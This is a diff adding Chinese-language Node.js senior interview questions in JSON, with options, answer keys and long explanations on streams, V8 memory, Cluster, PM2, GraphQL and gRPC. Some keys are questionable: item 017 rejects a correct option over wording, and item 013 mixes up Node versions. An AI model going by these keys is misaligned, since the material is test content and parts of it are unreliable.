+      "options": [
+        { "id": "A", "text": "方式1最简洁，pipe会自动传播错误" },
+        {
+          "id": "B",
+          "text": "方式2正确，pipe不传播错误，需要单独监听每个流的error事件"
+        },
+        { "id": "C", "text": "方式3正确，pipe返回目标流，可以链式监听error" },
+        {
+          "id": "D",
+          "text": "应该使用stream.pipeline()替代pipe，自动处理错误和资源清理"
+        }
+      ],
+      "correct_answer": "D",
+      "explanation": "这道题考察Stream错误处理的核心陷阱和最佳实践，这是一个常见的生产环境bug来源。\\n\\n**pipe的错误处理陷阱**：\\npipe方法有一个设计缺陷：它不会自动传播错误。当源流或目标流发生错误时：\\n- 错误只在对应的流上触发'error'事件\\n- 另一个流不会收到通知\\n- 可能导致资源泄漏、管道卡死\\n\\n**方式1的问题**：\\n完全没有错误处理，如果source.txt不存在：\\n- ReadStream触发'uncaughtException'\\n- 进程可能崩溃\\n\\n**方式2的问题**：\\n虽然监听了每个流的错误，但：\\n- 某个流出错时，另一个流不会被自动关闭\\n- 需要手动处理清理逻辑\\n- 代码冗长且容易遗漏\\n\\n**方式3的问题**：\\n只监听了目标流的错误：\\n- 源流的错误仍然会uncaught\\n- 同样存在资源泄漏问题\\n\\n**stream.pipeline的优势**：\\n```javascript\\nconst { pipeline } = require('stream');\\n\\npipeline(\\n  fs.createReadStream('source.txt'),\\n  fs.createWriteStream('dest.txt'),\\n  (err) => {\\n    if (err) {\\n      console.error('Pipeline failed:', err);\\n    } else {\\n      console.log('Pipeline succeeded');\\n    }\\n  }\\n);\\n```\\n\\npipeline自动处理：\\n- 所有流的错误传播\\n- 出错时关闭所有流\\n- 完成时的资源清理\\n\\n**pipeline vs pipe对比**：\\n| 特性 | pipe | pipeline |\\n|------|------|----------|\\n| 错误传播 | 不传播 | 自动传播 |\\n| 资源清理 | 手动 | 自动 |\\n| 回调通知 | 无 | 有 |\\n| Promise支持 | 无 | pipeline.promisified |\\n\\n**工程实践建议**：\\n1. 生产代码使用pipeline替代pipe\\n2. Node.js 15+可用stream.compose组合流\\n3. 始终提供错误处理回调\\n4. 使用abortController支持取消操作",
+      "wrong_options_analysis": {
+        "A": "pipe不会自动传播错误，这是最常见的误解。源流出错时，目标流完全不知道，反之亦然。",
+        "B": "虽然比方式1好，但仍然不完整。监听error只是处理了错误显示，没有处理资源清理和管道关闭。",
+        "C": "只监听了目标流的错误，源流的错误仍然会导致未捕获异常。而且没有资源清理逻辑。"
+      },
+      "knowledge_point": "Stream_Error_Handling",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_stream_pipeline_streams_callback"
+    },
+    {
+      "id": "node-senior-011",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["V8", "内存管理", "GC"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Node.js V8内存配置",
+      "content": "关于Node.js中V8引擎的内存配置，以下说法正确的是？\\n\\nNode.js默认对V8堆内存有限制，可以通过参数调整。",
+      "options": [
+        { "id": "A", "text": "Node.js 64位系统默认老生代内存上限约为1.4GB" },
+        {
+          "id": "B",
+          "text": "可以使用--max-old-space-size参数调整老生代内存上限"
+        },
+        { "id": "C", "text": "增大内存上限可以提高大内存应用的性能，无副作用" },
+        {
+          "id": "D",
+          "text": "可以使用v8.getHeapStatistics()获取堆内存详细信息"
+        },
+        { "id": "E", "text": "--max-semi-space-size用于调整新生代半空间大小" }
+      ],
+      "correct_answer": ["A", "B", "D", "E"],
+      "explanation": "这道题深入考察Node.js中V8内存配置的细节和最佳实践。\\n\\n**V8内存结构**：\\nV8堆内存分为几个区域：\\n- New Space（新生代）：存放短生命周期对象，使用Scavenge算法\\n- Old Space（老生代）：存放长生命周期对象，使用标记-清除-整理算法\\n- Code Space：存放JIT编译的代码\\n- Large Object Space：存放大对象\\n\\n**默认内存限制**：\\n- 64位系统：老生代约1.4GB\\n- 32位系统：老生代约700MB\\n- 这个限制是为了保证GC暂停时间在可接受范围内\\n\\n**关键配置参数**：\\n1. **--max-old-space-size**：设置老生代最大值（MB）\\n   ```bash\\n   node --max-old-space-size=4096 app.js\\n   ```\\n\\n2. **--max-semi-space-size**：设置新生代半空间大小（MB）\\n   - 新生代分为两个半空间（From和To）\\n   - 默认值根据系统位数不同\\n\\n3. **--max-new-space-size**：设置整个新生代大小\\n\\n**v8.getHeapStatistics()**：\\n返回详细的堆内存信息：\\n```javascript\\nconst v8 = require('v8');\\nconsole.log(v8.getHeapStatistics());\\n// {\\n//   total_heap_size: 4734976,\\n//   total_heap_size_executable: 524288,\\n//   total_physical_size: 4734976,\\n//   used_heap_size: 2897792,\\n//   heap_size_limit: 1501560832,\\n//   ...\\n// }\\n```\\n\\n**增大内存的副作用**：\\n选项C错误。增大内存上限会带来：\\n- 更长的GC暂停时间（标记-清除需要遍历更多对象）\\n- 可能影响实时性要求高的应用\\n- 需要权衡内存和响应时间\\n\\n**工程实践建议**：\\n1. 大内存应用适当增大--max-old-space-size\\n2. 高频创建对象的应用增大新生代空间\\n3. 使用--trace-gc分析GC行为\\n4. 监控heap_size_limit和used_heap_size的比值",
+      "exclusion_analysis": {
+        "C": "增大内存上限有明显副作用：GC暂停时间会增加。老生代使用标记-清除-整理算法，需要遍历整个堆，堆越大，暂停时间越长。对于实时性要求高的应用（如游戏服务器），需要谨慎权衡。"
+      },
+      "knowledge_point": "V8_Memory_Configuration",
+      "reference_link": "https://nodejs.org/api/v8.html#v8_v8_getheapstatistics"
+    },
+    {
+      "id": "node-senior-012",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["内存泄漏", "heapdump", "clinic.js"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "Node.js内存泄漏排查",
+      "content": "在Node.js内存泄漏排查中，以下工具和方法的使用场景描述正确的是？\\n\\n场景：生产环境服务运行一段时间后内存持续增长，需要诊断泄漏原因。",
+      "options": [
+        {
+          "id": "A",
+          "text": "使用heapdump生成快照，对比两个时间点的堆差异，找出增长的对象"
+        },
+        {
+          "id": "B",
+          "text": "使用--inspect标志启动调试，Chrome DevTools可以直接定位泄漏代码行"
+        },
+        {
+          "id": "C",
+          "text": "clinic.js doctor可以直接显示泄漏对象的具体类型和引用链"
+        },
+        {
+          "id": "D",
+          "text": "process.memoryUsage()足以定位内存泄漏，不需要额外工具"
+        }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题系统考察Node.js内存泄漏排查的工具链和方法论。\\n\\n**heapdump快照对比法**：\\n这是诊断内存泄漏的经典方法：\\n\\n1. **生成快照**：\\n   ```javascript\\n   const heapdump = require('heapdump');\\n   // 在不同时间点生成快照\\n   heapdump.writeSnapshot('/tmp/heap-1.heapsnapshot');\\n   // 运行一段时间后\\n   heapdump.writeSnapshot('/tmp/heap-2.heapsnapshot');\\n   ```\\n\\n2. **Chrome DevTools分析**：\\n   - 加载两个快照\\n   - 使用Comparison视图\\n   - 找出增长的对象类型\\n   - 查看对象的 retaining path（引用链）\\n\\n3. **关键指标**：\\n   - Delta：两个快照间的对象数量变化\\n   - Shallow Size：对象自身占用的内存\\n   - Retained Size：对象及其引用链占用的总内存\\n\\n**--inspect的局限**：\\n选项B错误。--inspect提供调试功能，但：\\n- 不能自动定位泄漏代码\\n- 需要配合手动分析和快照对比\\n- 实时性差，不适合生产环境长期连接\\n\\n**clinic.js工具链**：\\nclinic.js是一套诊断工具，但各工具职责不同：\\n- clinic doctor：诊断整体健康，发现异常模式\\n- clinic heapprofiler：堆内存分析\\n- clinic flame：CPU火焰图\\n\\n选项C错误。clinic doctor显示的是趋势和异常，不直接显示泄漏对象。需要配合heapprofiler。\\n\\n**process.memoryUsage()的局限**：\\n只能看到总体内存使用，无法定位具体泄漏对象。\\n\\n**工程实践建议**：\\n1. 开发环境使用 clinic.js 做预防性检测\\n2. 生产环境使用 heapdump 做事后分析\\n3. 设置内存告警阈值\\n4. 定期重启策略作为临时缓解措施\\n5. 使用 --trace-warnings 捕获警告信息",
+      "wrong_options_analysis": {
+        "B": "--inspect提供的是调试接口，Chrome DevTools可以查看堆快照，但不会自动定位泄漏代码。这需要开发者手动对比快照、分析引用链。而且生产环境长期开启调试端口有安全风险。",
+        "C": "clinic.js doctor显示的是应用整体健康指标和异常趋势（如事件循环延迟、CPU使用），并不直接显示泄漏对象。需要使用 clinic heapprofiler 才能看到具体的堆分析。",
+        "D": "process.memoryUsage()只返回rss、heapTotal、heapUsed、external四个总体指标，完全无法定位泄漏的具体对象类型和位置。这只是监控指标，不是诊断工具。"
+      },
+      "knowledge_point": "NodeJS_Memory_Leak_Debug",
+      "reference_link": "https://nodejs.org/en/docs/guides/debugging-getting-started/"
+    },
+    {
+      "id": "node-senior-013",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Cluster", "进程管理", "负载均衡"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "Cluster模块负载均衡",
+      "content": "关于Node.js Cluster模块的负载均衡机制，以下描述正确的是？\\n\\n```javascript\\nconst cluster = require('cluster');\\nconst os = require('os');\\n\\nif (cluster.isMaster) {\\n  const cpuCount = os.cpus().length;\\n  for (let i = 0; i < cpuCount; i++) {\\n    cluster.fork();\\n  }\\n} else {\\n  require('./server'); // 启动HTTP服务器\\n}\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Cluster使用轮询（round-robin）算法分发连接，Windows和Linux行为一致"
+        },
+        {
+          "id": "B",
+          "text": "Cluster依赖操作系统的负载均衡，Master进程不参与连接分发"
+        },
+        {
+          "id": "C",
+          "text": "Node.js 12+使用轮询算法作为默认负载均衡策略，Master进程接收连接后分发给Worker"
+        },
+        { "id": "D", "text": "每个Worker独立监听端口，操作系统自动分发连接" }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题深入考察Cluster模块的负载均衡原理和跨平台差异。\\n\\n**Cluster工作模式**：\\nCluster模块有两种工作模式：\\n\\n1. **Round-Robin模式**（Node.js默认）：\\n   - Master进程监听端口\\n   - 新连接到达时，Master分发给选中的Worker\\n   - 通过IPC传递连接句柄\\n\\n2. **操作系统调度模式**：\\n   - 所有Worker共享同一个监听socket\\n   - 操作系统内核决定分发\\n   - 可能导致负载不均\\n\\n**轮询算法详解**：\\n```javascript\\n// Node.js源码中的简化逻辑\\nlet round = 0;\\nfunction distribute(connection) {\\n  const worker = workers[round % workers.length];\\n  worker.send({ act: 'newconn' }, connection);\\n  round++;\\n}\\n```\\n\\n**历史演变**：\\n- Node.js早期版本：使用操作系统调度\\n- Windows平台问题：连接分布不均\\n- Node.js 0.12+：引入round-robin作为默认\\n\\n**跨平台差异**：\\n选项A错误。虽然Node.js努力统一行为，但某些平台上仍可能有细微差异。不过round-robin已成为主流默认策略。\\n\\n**cluster.schedulingPolicy**：\\n可以手动设置调度策略：\\n```javascript\\ncluster.schedulingPolicy = cluster.SCHED_RR;  // 轮询\\ncluster.schedulingPolicy = cluster.SCHED_NONE; // 操作系统调度\\n```\\n\\n**与PM2的关系**：\\nPM2的cluster模式底层就是使用Node.js Cluster模块，并增加了进程守护、日志管理等功能。\\n\\n**工程实践建议**：\\n1. 使用默认的round-robin策略\\n2. Worker数量通常等于CPU核心数\\n3. 监听Worker退出事件并自动重启\\n4. 使用进程间通信同步状态",
+      "wrong_options_analysis": {
+        "A": "虽然round-robin是默认策略，但Windows和Linux在某些版本上行为有历史差异。而且cluster.schedulingPolicy可以改变策略，所以不能说行为完全一致。",
+        "B": "这是旧版本的行为描述。现代Node.js默认使用round-robin，Master进程积极参与连接分发，通过IPC传递连接句柄给Worker。",
+        "D": "这正是round-robin模式要解决的问题。在round-robin模式下，只有Master监听端口，Worker不直接监听。操作系统调度模式（SCHED_NONE）才是这种方式。"
+      },
+      "knowledge_point": "Cluster_Load_Balancing",
+      "reference_link": "https://nodejs.org/api/cluster.html"
+    },
+    {
+      "id": "node-senior-014",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Cluster", "零停机", "Graceful Reload"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Cluster零停机重载实现",
+      "content": "实现Cluster模式的零停机重载（Graceful Reload），以下哪些是必要的步骤？",
+      "options": [
+        { "id": "A", "text": "新Worker启动成功后，立即关闭旧Worker的连接接收" },
+        { "id": "B", "text": "旧Worker需要等待现有连接处理完成后再退出" },
+        { "id": "C", "text": "使用disconnect事件通知旧Worker停止接收新连接" },
+        { "id": "D", "text": "需要设置超时强制退出机制，防止僵尸Worker" },
+        { "id": "E", "text": "所有Worker共享同一个监听socket，无需额外处理" }
+      ],
+      "correct_answer": ["A", "B", "C", "D"],
+      "explanation": "这道题系统考察零停机重载的实现原理和关键步骤。\\n\\n**零停机重载的核心流程**：\\n\\n1. **启动新Worker**：\\n   - Fork新进程\\n   - 等待新Worker准备就绪（listening事件）\\n   - 新Worker开始接收新连接\\n\\n2. **优雅关闭旧Worker**：\\n   - 调用worker.disconnect()\\n   - 触发disconnect事件\\n   - 旧Worker停止接收新连接\\n   - 等待现有连接处理完成\\n\\n3. **超时保护**：\\n   - 设置强制退出超时\\n   - 防止长连接阻塞重启\\n   - 确保重启流程完成\\n\\n**代码实现示例**：\\n```javascript\\nfunction gracefulReload() {\\n  const newWorker = cluster.fork();\\n  \\n  newWorker.on('listening', () => {\\n    // 新Worker就绪，开始关闭旧Worker\\n    Object.values(cluster.workers).forEach(worker => {\\n      if (worker.id !== newWorker.id) {\\n        worker.disconnect(); // 触发优雅关闭\\n        \\n        // 超时保护\\n        setTimeout(() => {\\n          if (worker.isConnected()) {\\n            worker.kill();\\n          }\\n        }, 30000);\\n      }\\n    });\\n  });\\n}\\n```\\n\\n**关键事件流**：\\n```\\nworker.disconnect()\\n  ↓\\nWorker收到disconnect事件\\n  ↓\\nworker.disconnect() → 关闭所有server\\n  ↓\\n等待现有连接完成\\n  ↓\\n'disconnect'事件触发\\n  ↓\\nWorker进程退出\\n```\\n\\n**选项E错误原因**：\\n虽然Worker共享监听socket，但零停机重载需要协调新旧Worker的生命周期，不能简单地\"无需额外处理\"。需要确保：\\n- 新Worker就绪后再关闭旧的\\n- 旧连接有足够时间完成\\n- 避免同时关闭所有Worker\\n\\n**工程实践建议**：\\n1. 使用PM2的reload命令（底层实现这些逻辑）\\n2. 监控Worker状态和重启耗时\\n3. 对长连接设置合理的超时\\n4. 记录重载事件日志",
+      "exclusion_analysis": {
+        "E": "虽然Cluster确实让Worker共享监听socket，但这不意味着零停机重载自动完成。需要精心协调新旧Worker的生命周期：新Worker必须先就绪、旧Worker需要优雅关闭、超时需要强制退出。这些都需要额外代码处理。"
+      },
+      "knowledge_point": "Cluster_Graceful_Reload",
+      "reference_link": "https://nodejs.org/api/cluster.html#cluster_worker_disconnect"
+    },
+    {
+      "id": "node-senior-015",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["PM2", "进程守护", "日志切割"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "PM2进程守护原理",
+      "content": "关于PM2的进程守护和日志管理机制，以下描述正确的是？\\n\\nPM2是Node.js生产环境常用的进程管理器。",
+      "options": [
+        {
+          "id": "A",
+          "text": "PM2使用Cluster模块管理进程，God Daemon负责监控和重启"
+        },
+        {
+          "id": "B",
+          "text": "PM2的日志切割通过监听SIGUSR2信号触发，需要配合pm2-logrotate"
+        },
+        {
+          "id": "C",
+          "text": "PM2进程崩溃后会自动重启，但内存超限不会触发重启"
+        },
+        {
+          "id": "D",
+          "text": "PM2的负载均衡不依赖Node.js Cluster，而是自己实现了一套调度系统"
+        }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入考察PM2的核心架构和工作原理。\\n\\n**PM2架构组成**：\\n\\n1. **God Daemon（守护进程）**：\\n   - 独立运行的守护进程\\n   - 负责管理所有应用进程\\n   - 监控进程状态\\n   - 自动重启崩溃进程\\n\\n2. **Cluster模式**：\\n   - 底层使用Node.js Cluster模块\\n   - 支持多进程负载均衡\\n   - 通过fork创建Worker进程\\n\\n3. **进程通信**：\\n   - God Daemon与Worker通过IPC通信\\n   - 支持RPC调用\\n   - 状态同步和命令传递\\n\\n**日志管理机制**：\\nPM2提供日志聚合和管理：\\n- stdout/stderr重定向到日志文件\\n- 支持日志刷新（pm2 flush）\\n- pm2-logrotate模块提供日志切割\\n\\n选项B不准确：pm2-logrotate是独立模块，通过cron或文件大小触发切割，不是监听SIGUSR2信号。\\n\\n**内存限制重启**：\\nPM2支持内存超限自动重启：\\n```bash\\npm2 start app.js --max-memory-restart 300M\\n```\\n选项C错误。\\n\\n**负载均衡实现**：\\nPM2的cluster模式直接使用Node.js Cluster模块的round-robin调度，没有自己实现调度系统。选项D错误。\\n\\n**PM2核心配置项**：\\n```javascript\\n// ecosystem.config.js\\nmodule.exports = {\\n  apps: [{\\n    name: 'app',\\n    script: 'app.js',\\n    instances: 'max',  // CPU核心数\\n    exec_mode: 'cluster',\\n    max_memory_restart: '500M',\\n    autorestart: true,\\n    watch: false,\\n    // 日志配置\\n    log_date_format: 'YYYY-MM-DD HH:mm:ss',\\n    error_file: './logs/error.log',\\n    out_file: './logs/out.log',\\n    merge_logs: true\\n  }]\\n};\\n```\\n\\n**工程实践建议**：\\n1. 使用ecosystem.config.js管理配置\\n2. 开启max_memory_restart防止内存泄漏\\n3. 配置pm2-logrotate自动切割日志\\n4. 使用pm2-god或keymetrics监控",
+      "wrong_options_analysis": {
+        "B": "pm2-logrotate模块确实提供日志切割功能，但它通过检查文件大小或定时任务触发，不是通过SIGUSR2信号。SIGUSR2在某些应用中用于自定义日志刷新，但不是PM2的标准机制。",
+        "C": "PM2明确支持内存超限自动重启。通过--max-memory-restart参数设置，当进程RSS超过阈值时，PM2会优雅重启该进程。这是处理内存泄漏的标准方案。",
+        "D": "PM2的cluster模式负载均衡直接使用Node.js Cluster模块，没有自己实现调度系统。它的价值在于进程管理（守护、重启、日志等），而不是重新实现负载均衡。"
+      },
+      "knowledge_point": "PM2_Process_Management",
+      "reference_link": "https://pm2.keymetrics.io/docs/usage/cluster-mode/"
+    },
+    {
+      "id": "node-senior-016",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Stream", "Web Streams API", "对比"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "Node.js Stream vs Web Streams API",
+      "content": "关于Node.js Stream和Web Streams API的差异，以下描述正确的是？\\n\\n```javascript\\n// Node.js Stream\\nconst { Readable } = require('stream');\\nconst nodeStream = new Readable({\\n  read() { this.push('data'); this.push(null); }\\n});\\n\\n// Web Streams API\\nconst webStream = new ReadableStream({\\n  start(controller) {\\n    controller.enqueue('data');\\n    controller.close();\\n  }\\n});\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Node.js Stream支持背压机制，Web Streams API不支持背压"
+        },
+        {
+          "id": "B",
+          "text": "Web Streams API使用Promise-based接口，Node.js Stream使用回调模式"
+        },
+        { "id": "C", "text": "两者完全兼容，可以无缝互换使用" },
+        {
+          "id": "D",
+          "text": "Node.js Stream只能在Node.js环境使用，Web Streams API只能在浏览器使用"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入对比两种流API的设计哲学和技术差异。\\n\\n**设计哲学差异**：\\n\\n1. **Node.js Stream**：\\n   - 早期设计（Node.js 0.4+）\\n   - 回调/事件驱动\\n   - 强调高性能和低开销\\n   - 背压是核心设计\\n\\n2. **Web Streams API**：\\n   - 标准化API（WHATWG Streams）\\n   - Promise-based设计\\n   - 跨平台（浏览器和Node.js）\\n   - 更现代的异步模式\\n\\n**背压机制对比**：\\n两者都支持背压，但实现方式不同：\\n\\nNode.js Stream：\\n```javascript\\n// 通过write返回值和drain事件\\nconst canContinue = writable.write(chunk);\\nif (!canContinue) {\\n  writable.once('drain', () => continueWriting());\\n}\\n```\\n\\nWeb Streams API：\\n```javascript\\n// 通过WritableStream的write Promise\\nawait writer.write(chunk); // 自动处理背压\\n// 或检查desiredSize\\nif (controller.desiredSize > 0) {\\n  controller.enqueue(chunk);\\n}\\n```\\n\\n选项A错误，Web Streams API明确支持背压。\\n\\n**互操作性**：\\nNode.js 16+提供了转换工具：\\n```javascript\\nconst { Readable } = require('stream');\\nconst webStream = Readable.toWeb(nodeStream);\\nconst nodeStream = Readable.fromWeb(webStream);\\n```\\n\\n选项C过于绝对，需要转换才能互用。\\n\\n**平台支持**：\\n- Node.js Stream：Node.js专属\\n- Web Streams API：浏览器原生支持，Node.js 16+也支持\\n\\n选项D错误。\\n\\n**代码风格对比**：\\n```javascript\\n// Node.js消费流\\nstream.on('data', chunk => {});\\nstream.on('end', () => {});\\n\\n// Web Streams消费流\\nconst reader = stream.getReader();\\nwhile (true) {\\n  const { done, value } = await reader.read();\\n  if (done) break;\\n  // 处理value\\n}\\n```\\n\\n**工程实践建议**：\\n1. 新项目考虑Web Streams API（更现代）\\n2. 与浏览器共享代码时使用Web Streams\\n3. 高性能场景Node.js Stream可能更快\\n4. 使用转换工具实现互操作",
+      "wrong_options_analysis": {
+        "A": "Web Streams API完全支持背压，只是机制不同。它通过controller.desiredSize属性和Promise的自动队列管理实现背压。这是误解。",
+        "C": "虽然Node.js提供了转换工具（Readable.toWeb/fromWeb），但两者的API不兼容，不能直接互换。需要显式转换。",
+        "D": "Web Streams API是WHATWG标准，Node.js 16+原生支持。虽然最初是为浏览器设计，但现在两个平台都可以使用。"
+      },
+      "knowledge_point": "Stream_vs_Web_Streams",
+      "reference_link": "https://nodejs.org/api/webstreams.html"
+    },
+    {
+      "id": "node-senior-017",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["BFF", "GraphQL", "DataLoader"],
+      "source_company": "ByteDance",
+      "score": 8,
+      "title": "GraphQL N+1问题与DataLoader",
+      "content": "关于GraphQL中的N+1问题和DataLoader解决方案，以下描述正确的是？\\n\\n```graphql\\nquery {\\n  users {\\n    id\\n    name\\n    posts {\\n      title\\n    }\\n  }\\n}\\n```\\n\\n假设有10个用户，每个用户有多个文章。",
+      "options": [
+        {
+          "id": "A",
+          "text": "上述查询会产生N+1问题：1次查询用户 + N次查询每个用户的文章"
+        },
+        {
+          "id": "B",
+          "text": "DataLoader通过缓存查询结果解决N+1问题，单个请求内相同参数的查询只执行一次"
+        },
+        {
+          "id": "C",
+          "text": "DataLoader的batch机制在每个GraphQL字段解析时立即执行"
+        },
+        {
+          "id": "D",
+          "text": "N+1问题只存在于REST API，GraphQL天然不会产生此问题"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察GraphQL性能优化的核心问题——N+1查询及其解决方案。\\n\\n**N+1问题分析**：\\n在GraphQL查询中，如果没有优化：\\n\\n```javascript\\n// 用户resolver\\nconst User = {\\n  posts: (user) => {\\n    // 每个用户都执行一次查询！\\n    return db.query('SELECT * FROM posts WHERE user_id = ?', [user.id]);\\n  }\\n};\\n```\\n\\n10个用户会产生：\\n- 1次用户查询\\n- 10次文章查询（每个用户一次）\\n- 总共11次数据库查询\\n\\n选项A描述了问题但不够准确：是1+N次，不是N+1次（数学上相同但表述不规范）。\\n\\n**DataLoader解决方案**：\\nDataLoader提供两个核心功能：\\n\\n1. **批处理（Batching）**：\\n   - 收集一个tick内的所有请求\\n   - 合并为单次批量查询\\n   - 减少数据库往返\\n\\n2. **缓存（Caching）**：\\n   - 同一请求内的相同参数查询\\n   - 只执行一次\\n   - 后续请求返回缓存结果\\n\\n**DataLoader使用示例**：\\n```javascript\\nconst DataLoader = require('dataloader');\\n\\nconst postLoader = new DataLoader(async (userIds) => {\\n  // 批量查询所有用户的文章\\n  const posts = await db.query(\\n    'SELECT * FROM posts WHERE user_id IN (?)', [userIds]\\n  );\\n  // 按userIds顺序分组返回\\n  return userIds.map(id => posts.filter(p => p.user_id === id));\\n});\\n\\n// Resolver中使用\\nconst User = {\\n  posts: (user, args, { loaders }) => {\\n    return loaders.posts.load(user.id);\\n  }\\n};\\n```\\n\\n**批处理时机**：\\nDataLoader使用process.nextTick收集请求，在一个事件循环tick结束时批量执行。选项C错误。\\n\\n**工程实践建议**：\\n1. 每个请求创建新的DataLoader实例（请求级缓存）\\n2. 合理设置batch size\\n3. 对于复杂查询考虑使用dataloader-cache-sql等扩展\\n4. 监控批量查询大小和延迟",
+      "wrong_options_analysis": {
+        "A": "虽然描述了N+1问题现象，但表述不够精确。应该说是'1次用户查询 + N次文章查询'，总共1+N次。而且关键是解释DataLoader如何解决，而不只是描述问题。",
+        "C": "DataLoader不会在每个字段解析时立即执行。它收集一个事件循环tick内的所有load调用，然后批量执行。这是通过process.nextTick实现的延迟批处理。",
+        "D": "GraphQL反而更容易产生N+1问题，因为它允许客户端指定嵌套查询。REST API通常在服务端控制返回数据，更容易优化。GraphQL需要额外工具如DataLoader来解决。"
+      },
+      "knowledge_point": "GraphQL_N1_DataLoader",
+      "reference_link": "https://github.com/graphql/dataloader"
+    },
+    {
+      "id": "node-senior-018",
+      "type": "multiple_choice",
+      "difficulty": "expert",
+      "tags": ["BFF", "Schema Stitching", "Federation"],
+      "source_company": "Alibaba",
+      "score": 12,
+      "title": "GraphQL Schema Stitching vs Federation",
+      "content": "关于GraphQL Schema Stitching和Apollo Federation的比较，以下说法正确的是？",
+      "options": [
+        {
+          "id": "A",
+          "text": "Schema Stitching在网关层合并多个服务的Schema， Federation使用分布式架构"
+        },
+        {
+          "id": "B",
+          "text": "Federation的实体(Entities)允许跨服务解析字段，每个服务实现resolveReference"
+        },
+        {
+          "id": "C",
+          "text": "Schema Stitching更适合遗留系统集成，Federation更适合新构建的微服务架构"
+        },
+        {
+          "id": "D",
+          "text": "Federation 2移除了@key、@external等指令，简化了配置"
+        },
+        {
+          "id": "E",
+          "text": "Schema Stitching的网关是性能瓶颈，Federation没有单点问题"
+        }
+      ],
+      "correct_answer": ["A", "B", "C"],
+      "explanation": "这道题深入对比两种GraphQL微服务架构方案的设计理念和适用场景。\\n\\n**Schema Stitching架构**：\\n```\\n客户端 → API网关（Schema合并） → 服务A/B/C\\n```\n\\n特点：\\n- 集中式Schema合并\\n- 网关负责查询分解和结果聚合\\n- 所有服务Schema需要上传到网关\\n- 网关是查询执行的协调中心\\n\\n**Apollo Federation架构**：\\n```\\n客户端 → Apollo Router/网关 → 服务A（主）/服务B（引用解析）\\n```\\n\\n特点：\\n- 分布式Schema所有权\\n- 每个服务定义自己的Schema和解析逻辑\\n- 通过@key定义实体标识\\n- 服务间协作解析关联字段\\n\\n**核心概念对比**：\\n\\n| 特性 | Schema Stitching | Federation |\\n|------|-----------------|------------|\\n| 架构 | 集中式网关 | 分布式协作 |\\n| Schema所有权 | 网关 | 各服务 |\\n| 跨服务关联 | 手动编写resolver | @key + _resolveReference |\\n| 学习曲线 | 较低 | 较高 |\\n\\n**Federation实体解析**：\\n选项B正确。\\n```graphql\\n# 产品服务\\ntype Product @key(fields: \"id\") {\\n  id: ID!\\n  name: String\\n}\\n\\n# 评论服务\\nextend type Product @key(fields: \"id\") {\\n  id: ID! @external\\n  reviews: [Review] @requires(fields: \"id\")\\n}\\n```\\n\\n评论服务实现resolveReference：\\n```javascript\\nconst resolvers = {\\n  Product: {\\n    __resolveReference(product, { fetchProductById }) {\\n      return fetchProductById(product.id);\\n    }\\n  }\\n};\\n```\\n\\n**Federation 2的变化**：\\n选项D错误。Federation 2实际上增强了声明式能力，@key等指令仍然存在，但简化了配置流程。\\n\\n**性能考量**：\\n选项E过于绝对。Federation的Apollo Router仍然是网关，只是逻辑更分散。两者都有网关层，都可能成为瓶颈，需要合理扩展。\\n\\n**工程实践建议**：\\n1. 遗留系统迁移选择Schema Stitching\\n2. 全新微服务架构选择Federation\\n3. 考虑团队熟悉度\\n4. 评估网关层扩展需求",
+      "exclusion_analysis": {
+        "D": "Federation 2并没有移除@key、@external等指令。相反，它增强了这些指令的能力，同时简化了配置流程。指令仍然是Federation的核心机制。",
+        "E": "Federation仍然有Apollo Router作为网关层，并非完全去中心化。只是查询解析逻辑更分散。如果Router成为瓶颈，同样需要扩展。这个对比过于简化。"
+      },
+      "knowledge_point": "GraphQL_Stitching_vs_Federation",
+      "reference_link": "https://www.apollographql.com/docs/federation/"
+    },
+    {
+      "id": "node-senior-019",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["微服务", "gRPC", "Protocol Buffers"],
+      "source_company": "Tencent",
+      "score": 8,
+      "title": "gRPC与Protocol Buffers",
+      "content": "关于Node.js中使用gRPC和Protocol Buffers，以下描述正确的是？\\n\\n```protobuf\\nsyntax = \\\"proto3\\\";\\n\\nmessage User {\\n  int32 id = 1;\\n  string name = 2;\\n}\\n\\nservice UserService {\\n  rpc GetUser (UserRequest) returns (User);\\n}\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Protocol Buffers序列化比JSON快，因为使用二进制格式，但牺牲了可读性"
+        },
+        { "id": "B", "text": "gRPC使用HTTP/2作为传输层，支持双向流和头部压缩" },
+        { "id": "C", "text": "Protocol Buffers只能用于gRPC，不能独立使用" },
+        { "id": "D", "text": "gRPC的流式RPC在Node.js中使用EventEmitter实现" }
+      ],
+      "correct_answer": "B",
